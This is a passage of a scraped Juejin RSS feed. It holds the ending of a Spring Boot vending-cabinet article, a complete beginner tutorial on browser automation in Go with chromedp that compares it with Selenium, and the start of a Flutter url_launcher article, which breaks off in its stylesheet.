        template.setValueSerializer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericJackson2JsonRedisSerializer</span>());
        template.setHashKeySerializer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRedisSerializer</span>());
        template.setHashValueSerializer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericJackson2JsonRedisSerializer</span>());
        <span class="hljs-keyword">return</span> template;
    }
}
</code></pre>
<h2 data-id="heading-13">总结</h2>
<p><strong>1.异步处理</strong>：结算流程异步化，用户无需等待
<strong>2.三重校验</strong>：视觉+重量+事件记录，确保准确率
<strong>3.实时通信</strong>：MQTT保证设备与后台实时通信
<strong>4.缓存优化</strong>：Redis提升系统响应速度
<strong>5.异常容错</strong>：完善的异常处理机制</p>
<p>这种系统完美融合了物联网、云计算、移动支付等前沿技术，为用户提供了拿了就走的无感购物体验，代表了零售行业数字化转型的最新成果。</p>
<blockquote>
<p>本文首发于公众号：程序员刘大华，专注分享前后端开发的实战笔记。关注我，少走弯路，一起进步！</p>
</blockquote>
<h4 data-id="heading-14">📌往期精彩</h4>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fmaq_p_m5vd7KS-xyXt5rcA" target="_blank" title="https://mp.weixin.qq.com/s/maq_p_m5vd7KS-xyXt5rcA" ref="nofollow noopener noreferrer">《SpringBoot+MySQL+Vue实现文件共享系统》</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FqI3TRTdDfRJSH9kCTqAQUw" target="_blank" title="https://mp.weixin.qq.com/s/qI3TRTdDfRJSH9kCTqAQUw" ref="nofollow noopener noreferrer">《这 10 个 MySQL 高级用法，让你的代码又快又好看》</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FqFIhl5wkoebcMbmv0iSOBw" target="_blank" title="https://mp.weixin.qq.com/s/qFIhl5wkoebcMbmv0iSOBw" ref="nofollow noopener noreferrer">《别再折腾ES了！这个兼容MySQL的轻量搜索引擎，才是中小项目的首选》</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F6OtqR95LH9Yxv3Zztjz4YQ" target="_blank" title="https://mp.weixin.qq.com/s/6OtqR95LH9Yxv3Zztjz4YQ" ref="nofollow noopener noreferrer">《SpringBoot + MQTT 如何实现取货就走的智能售货柜系统》</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[用 Go 做浏览器自动化？chromedp 带你飞！]]></title>    <link>https://juejin.cn/post/7579169543233257472</link>    <guid>https://juejin.cn/post/7579169543233257472</guid>    <pubDate>2025-12-03T07:01:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579169543233257472" data-draft-id="7579165599043452943" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" 用 Go 做浏览器自动化？chromedp 带你飞！"/> <meta itemprop="keywords" content="后端,Go,Trae"/> <meta itemprop="datePublished" content="2025-12-03T07:01:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员爱钓鱼"/> <meta itemprop="url" content="https://juejin.cn/user/2799775299157614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             用 Go 做浏览器自动化？chromedp 带你飞！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2799775299157614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员爱钓鱼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-03T07:01:39.000Z" title="Wed Dec 03 2025 07:01:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>当大家提到“浏览器自动化”，第一反应往往是 Python + Selenium。
但其实 <strong>Go 语言也能做浏览器自动化，而且更快、更稳定、更轻量！</strong></p>
</blockquote>
<p>这篇文章我们就来聊聊：
<strong>如何用 Go + chromedp 实现和 Python Selenium 一样的网页操作自动化。</strong></p>
<hr/>
<h2 data-id="heading-0">为什么要用 Go 做浏览器自动化？</h2>
<p>如果你做过 Python 自动化，你可能遇到：</p>
<ul>
<li>Selenium 启动浏览器太慢</li>
<li>ChromeDriver 与 Chrome 版本对不上</li>
<li>脚本跑久了容易卡死</li>
<li>CPU 占用高</li>
</ul>
<p>而 chromedp 解决了这些痛点：</p>
<h3 data-id="heading-1">✔ 不需要 ChromeDriver</h3>
<p>直接使用浏览器内置的 DevTools 协议控制浏览器，比 Selenium 少了一层驱动。</p>
<h3 data-id="heading-2">✔ 速度快到飞起</h3>
<p>chromedp 基于 Go 并发模型，性能比 Python Selenium 更高。</p>
<h3 data-id="heading-3">✔ 更稳定</h3>
<p>通过 CDP（Chrome DevTools Protocol），由 Google 官方维护协议，本质稳定性更好。</p>
<h3 data-id="heading-4">✔ 可以 Headless/有界面任意切换</h3>
<p>既能无界面跑脚本，也能像人一样操作浏览器。</p>
<h3 data-id="heading-5">✔ 非常适合服务器、Docker 等环境运行</h3>
<p>相比 Selenium 更轻量。</p>
<hr/>
<h2 data-id="heading-6">chromedp 是什么？</h2>
<p>chromedp 是 Go 官方团队成员维护的一个库，用来通过 CDP 协议控制 Chrome。</p>
<p>它可以：</p>
<ul>
<li>打开 URL</li>
<li>自动点击元素</li>
<li>自动填写表单</li>
<li>自动执行 JS</li>
<li>自动截图</li>
<li>获取 DOM 内容</li>
<li>模拟真实用户行为</li>
</ul>
<p>几乎你用 Selenium 能做的，它都能做，而且更快。</p>
<hr/>
<h2 data-id="heading-7">✨ 最简单示例：打开网页并获得标题</h2>
<p>下面是一个完整可运行的 chromedp 代码，演示：</p>
<ol>
<li>打开 Google</li>
<li>等待 2 秒</li>
<li>获取网页标题</li>
</ol>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"context"</span>
	<span class="hljs-string">"log"</span>
	<span class="hljs-string">"time"</span>

	<span class="hljs-string">"github.com/chromedp/chromedp"</span>
)

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
	ctx, cancel := chromedp.NewContext(context.Background())
	<span class="hljs-keyword">defer</span> cancel()

	<span class="hljs-keyword">var</span> res <span class="hljs-type">string</span>

	err := chromedp.Run(ctx,
		chromedp.Navigate(<span class="hljs-string">"https://www.google.com"</span>),
		chromedp.Sleep(<span class="hljs-number">2</span>*time.Second),
		chromedp.Evaluate(<span class="hljs-string">`document.title`</span>, &amp;res),
	)

	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		log.Fatal(err)
	}

	log.Println(<span class="hljs-string">"页面标题:"</span>, res)
}
</code></pre>
<p>运行后终端会输出：</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">页面标题: Google</span>
</code></pre>
<p>一个非常简单的示例，却展示了 chromedp 自动化的威力。</p>
<hr/>
<h2 data-id="heading-8">chromedp 能做什么？</h2>
<p>这里列一部分最常见的自动化任务。</p>
<h3 data-id="heading-9">▶ 自动点击网页按钮</h3>
<pre><code class="hljs language-go" lang="go">chromedp.Click(<span class="hljs-string">`#login-button`</span>)
</code></pre>
<h3 data-id="heading-10">▶ 自动输入内容</h3>
<pre><code class="hljs language-go" lang="go">chromedp.SendKeys(<span class="hljs-string">`#username`</span>, <span class="hljs-string">"admin"</span>)
</code></pre>
<h3 data-id="heading-11">▶ 等待元素加载</h3>
<pre><code class="hljs language-go" lang="go">chromedp.WaitVisible(<span class="hljs-string">`#content`</span>)
</code></pre>
<h3 data-id="heading-12">▶ 执行 JavaScript</h3>
<pre><code class="hljs language-go" lang="go">chromedp.Evaluate(<span class="hljs-string">`document.querySelector("#num").innerText`</span>, &amp;value)
</code></pre>
<h3 data-id="heading-13">▶ 截图网页</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">var</span> buf []<span class="hljs-type">byte</span>
chromedp.Screenshot(<span class="hljs-string">`body`</span>, &amp;buf)
</code></pre>
<h3 data-id="heading-14">▶ 批量爬取网页数据</h3>
<p>完全可以替代 Python 的 requests + BeautifulSoup + Selenium。</p>
<hr/>
<h2 data-id="heading-15">chromedp 与 Selenium 的对比</h2>








































<table><thead><tr><th>特性</th><th>Selenium</th><th>chromedp</th></tr></thead><tbody><tr><td>驱动依赖</td><td>需要 ChromeDriver</td><td>不需要</td></tr><tr><td>速度</td><td>较慢</td><td>非常快</td></tr><tr><td>稳定性</td><td>偶有卡死</td><td>稳定</td></tr><tr><td>运行环境</td><td>不适合 Docker</td><td>非常适合</td></tr><tr><td>控制协议</td><td>WebDriver</td><td>Chrome DevTools</td></tr><tr><td>学习难度</td><td>低</td><td>中等</td></tr></tbody></table>
<p>如果你需要大规模自动化任务，比如：</p>
<ul>
<li>批量登录操作</li>
<li>自动爬取内容</li>
<li>自动截图生成工具</li>
<li>Web 后台批量上传</li>
<li>网站 UI 自动化测试</li>
</ul>
<p>chromedp 是比 Selenium 更适合长期跑的方案。</p>
<hr/>
<h2 data-id="heading-16">更多 chromedp 实战（我可以帮你写）</h2>
<p>如果你需要实际业务自动化，我可以帮你写：</p>
<ul>
<li>自动登录网站</li>
<li>自动抓取商品信息</li>
<li>自动化公众号后台</li>
<li>自动化 Baijia 文章上传</li>
<li>自动化批量截图</li>
<li>自动化下载数据文件</li>
<li>批量爬取网页并导出 CSV</li>
</ul>
<p>告诉我你的需求，我来给你写完整可运行的 Go 自动化脚本。</p>
<hr/>
<h2 data-id="heading-17">总结</h2>
<p>Go + chromedp 是一个非常强大的浏览器自动化组合，它：</p>
<ul>
<li>不依赖 ChromeDriver</li>
<li>更轻量、更快速</li>
<li>更适合服务器环境</li>
<li>完全能实现 Selenium 的功能，甚至更强</li>
</ul>
<p>如果你正在使用 Python Selenium，不妨试一试 chromedp，它会让自动化变得更快、更简单。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[flutter-使用url_launcher打开链接/应用/短信/邮件和评分跳转等]]></title>    <link>https://juejin.cn/post/7579101504289882166</link>    <guid>https://juejin.cn/post/7579101504289882166</guid>    <pubDate>2025-12-03T00:48:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579101504289882166" data-draft-id="7579096485355536434" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="flutter-使用url_launcher打开链接/应用/短信/邮件和评分跳转等"/> <meta itemprop="keywords" content="前端,Android,Flutter"/> <meta itemprop="datePublished" content="2025-12-03T00:48:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="鹏多多"/> <meta itemprop="url" content="https://juejin.cn/user/747323639737191"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            flutter-使用url_launcher打开链接/应用/短信/邮件和评分跳转等
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/747323639737191/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    鹏多多
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-03T00:48:22.000Z" title="Wed Dec 03 2025 00:48:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:2;font-weight:400;font-size:15px;overflow-x:hidden;color:#333;letter-spacing:1.2px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child{margin-top:-1.5rem;margin-bottom:1rem}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{position:relative;font-size:2.5rem;margin-bottom:5px}.markdown-body h1:before{font-size:2.5rem}.markdown-body h2{padding-bottom:.5rem;font-size:2.2rem;border-bottom:1px solid #ececec}.markdown-body h3{font-size:1.5rem;padding-bottom:0}.markdown-body h4{font-size:1.25rem}.markdown-body h5{font-size:1rem}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body strong{color:#3eaf7c}.markdown-body img{max-width:100%;border-radius:2px;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #3eaf7c;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;padding:.2rem .5rem;margin:0;color:#3eaf7c;font-size:.85em;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:.5rem solid #3eaf7c}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{font-weight:500;text-decoration:none;color:#3eaf7c;margin:0 5px}.markdown-body a:active,.markdown-body a:hover{text-decoration:none;border-bottom:1.5px solid #3eaf7c}.markdown-body a[href^=http]:after{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTQiIGhlaWdodD0iMTQiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04MzIgMTI4SDY0MHY2NGgxNDYuNzUyTDUyMS4zNzYgNDU3LjM3Nmw0NS4yNDggNDUuMjQ4TDgzMiAyMzcuMjQ4VjM4NGg2NFYxMjh6IiBmaWxsPSIjM2VhZjdjIi8+PHBhdGggZD0iTTc2OCA4MzJIMTkyVjI1NmgzNTJ2LTY0SDE2MGEzMiAzMiAwIDAwLTMyIDMydjY0MGEzMiAzMiAwIDAwMzIgMzJoNjQwYTMyIDMyIDAgMDAzMi0zMlY0ODBoLTY0djM1MnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");margin-left:2px}.markdown-body a[href^="#"]:before{content:"#"}.markdown-body table{display:inline-block!important;font-size:13px;width:auto;max-width:100%;overflow:auto;border:1px solid #3eaf7c;border-collapse:collapse}.markdown-body thead{background:#3eaf7c;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(153,255,188,.1)}.markdown-body td,.markdown-body th{padding:4px 8px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#7b7878;padding:1px 23px;border-left:.5rem solid;border-color:#42b983;background-color:rgba(66,184,131,.1);position:relative;margin:14px 8px 0}.markdown-body blockquote:before{display:inline-block;position:absolute;content:url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjUiIGhlaWdodD0iMjUiIHZpZXdCb3g9IjAgMCAyNyAyNyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxLjg2MiAxLjg2MikiIGZpbGwtcnVsZT0ibm9uemVybyIgZmlsbD0ibm9uZSI+PGNpcmNsZSBzdHJva2U9IiNGRkYiIHN0cm9rZS13aWR0aD0iMS43MjQiIGZpbGw9IiM0MkI5ODMiIGN4PSIxMS42MzgiIGN5PSIxMS42MzgiIHI9IjExLjYzOCIvPjxwYXRoIGQ9Ik0xNC45NzggNi4yN0E1LjAwNiA1LjAwNiAwIDAwNi42NyA5LjQ2OGE0LjkwMSA0LjkwMSAwIDAwMS43NzMgNC4zNjJjLjMyMy4yNTguNTE0LjY0Ny41MjIgMS4wNnYxLjA2YTIuNjg1IDIuNjg1IDAgMDA1LjM3IDB2LTEuMDA4Yy4wMDItLjM5OC4xNzMtLjc3Ny40Ny0xLjA0MmE1LjAyMyA1LjAyMyAwIDAwLjE3My03LjYzem0tMy4zMzcgMTAuOTY3YTEuMzA0IDEuMzA0IDAgMDEtMS4yODYtMS4yODd2LS4yNzhoMi41NzJ2LjI2MWMwIC43MTMtLjU3MyAxLjI5NC0xLjI4NiAxLjMwNHptMi4yNi00LjQxNWMtLjQ0LjM4My0uNzUuODkzLS44ODcgMS40NmgtMi43NDZhMi44NjggMi44NjggMCAwMC0uOTM4LTEuNTNoLS4wMThhMy40NzYgMy40NzYgMCAwMS0xLjI2OS0zLjE0NSAzLjYxNSAzLjYxNSAwIDAxNy4xOTYuNCAzLjY1IDMuNjUgMCAwMS0xLjMzOCAyLjgxNXoiIGZpbGw9IiNGRkYiLz48L2c+PC9zdmc+");width:25px;height:25px;left:-16px;top:12px}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{outline:none;border:none;border-left:4px solid #3eaf7c;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary::-webkit-details-marker{color:#3eaf7c}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ol li::marker{color:#3eaf7c}.markdown-body ul li{list-style:none;padding-left:10px}.markdown-body ul li::marker{content:"•";color:#3eaf7c}.markdown-body ul li.task-list-item:before{content:"";margin-right:0}.markdown-body input[type=checkbox]{vertical-align:text-bottom;box-shadow:inset 0 0 0 10px #fff}.markdown-body input[type=checkbox]:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04NzcuMDU2IDE0Ni45NDR2NzMwLjExMkgxNDYuOTQ0VjE0Ni45NDRoNzMwLjExMnptMC0xMDQuMjc3SDE0Ni45NDRjLTU3LjYyOCAwLTEwNC4yNzcgNDYuNjQ5LTEwNC4yNzcgMTA0LjI3N3Y3MzAuMTEyYzAgNTcuNjI4IDQ2LjY0OSAxMDQuMjc3IDEwNC4yNzcgMTA0LjI3N2g3MzAuMTEyYzU3LjYyOCAwIDEwNC4yNzctNDYuNjQ5IDEwNC4yNzctMTA0LjI3N1YxNDYuOTQ0YzAtNTcuNjI4LTQ2LjY0OS0xMDQuMjc3LTEwNC4yNzctMTA0LjI3N3oiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}.markdown-body input[type=checkbox]:checked:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTUiIGhlaWdodD0iMTUiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik05MTAuMjA4IDBIMTEzLjc2QTExNC4xMTIgMTE0LjExMiAwIDAwLS4wMzIgMTEzLjc5MlY5MTAuMjRjMCA2Mi41OTIgNTEuMiAxMTMuNzkyIDExMy43OTIgMTEzLjc5Mmg3OTYuNDQ4YzYyLjU5MiAwIDExMy43OTItNTEuMiAxMTMuNzkyLTExMy43OTJWMTEzLjc5MkMxMDI0IDUxLjIgOTcyLjggMCA5MTAuMjA4IDB6bS01MTIgNzk2LjQ0OEwxMTMuNzYgNTEybDc5LjY0OC03OS42NDggMjA0LjggMjA0LjhMODMwLjU2IDIwNC44bDc5LjY0OCA3OS42NDgtNTEyIDUxMnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="agate">.markdown-body pre,.markdown-body 